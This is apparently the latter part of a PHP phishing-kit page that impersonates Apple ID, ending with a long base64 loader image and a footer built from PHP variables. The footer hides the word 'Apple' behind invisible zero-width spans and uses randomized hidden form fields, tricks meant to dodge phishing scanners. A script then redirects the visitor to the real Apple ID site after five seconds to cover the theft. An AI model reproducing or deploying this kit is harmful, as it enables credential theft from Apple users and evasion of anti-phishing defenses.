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"
                                     ></span></p>
                                    <p><?php echo $accessaccount;?></p>
                                    <p style="text-decoration: underline;color:red;"><?php echo $automaticallylogged;?></p>
                                </div>
                            </div>


                        </div>
                    </div>
                </div>
				<input type="hidden" name="<?php echo $gine;?>" value="<?php echo($rand);?>">
				<?php if(isset($_GET['don'])) { echo '<script> setTimeout(function(){location.href="https://www.google.co.uk/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0ahUKEwioqpfl4oPKAhWHPxQKHYGXAjkQFggfMAA&url=https%3A%2F%2Fappleid.apple.com%2F&usg=AFQjCNF7841Jq5PLrYJwYDN8RkcZjuNVww&sig2=gKBRh04c9wVr4EOc4FARAw&bvm=bv.110151844,d.d24"} , 5000); </script>'; } ?>
</div>
<!-- done -->

<footer>
<div class="container">
<div class="footer">
<div class="footer-wrap">
<div class="FooterLine1">
<div class="line-level"><?php echo $Shopthe;?><a href="#"><?php echo $OnlineStore;?></a> (1-800-MY-<div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'><?php echo $gram;?></span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'><?php echo $gram;?></span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'><?php echo $froot;?></span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'><?php echo $groot;?></span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'><?php echo $froot;?></span>e<span></div>),<?php echo $visit;?><a href="#"><?php echo $RetailStore;?></a>,<?php echo $find;?><a href="#"><?php echo $reseller;?></a>.</div>
</div>
<div class="FooterLine2">
<ul class="menu">
<li class="item"><a href="#"><?php echo $AppleInfo;?></a></li>
<li class="item"><a href="#"><?php echo $Map;?></a></li>
<li class="item"><a href="#"><?php echo $News;?></a></li>
<li class="item"><a href="#"><?php echo $Feeds;?></a></li>
<li class="item"><a href="#"><?php echo $Contact;?></a></li>
<li class="item"><a class="choose" href="#">
<img id="blackflags" src=""></a></li>
</ul>
</div><input type="hidden" name="<?php echo $gine;?>" value="<?php echo($rand);?>">
<div class="FooterLine3"><?php echo $rightsreserved;?>
<ul class="menu">
<li class="item"><a href="#"><?php echo $TermsUse;?></a></li>
<li class="item"><a href="#"><?php echo $Policy;?></a></li>
</ul>
</div>
</div>
</div><input type="hidden" name="<?php echo $gine;?>" value="<?php echo($rand);?>">
</div>
</footer>

</div>
</div>
</div>
</div>
</div>
</div>
<script>
var supercard;

function myCar() {
  supercard = setTimeout(showPage, 500);
}

function showPage() {
  document.getElementById("loader").style.display = "none";
  document.getElementById("myDiv").style.display = "block";
}
</script>
</body>
</html>                         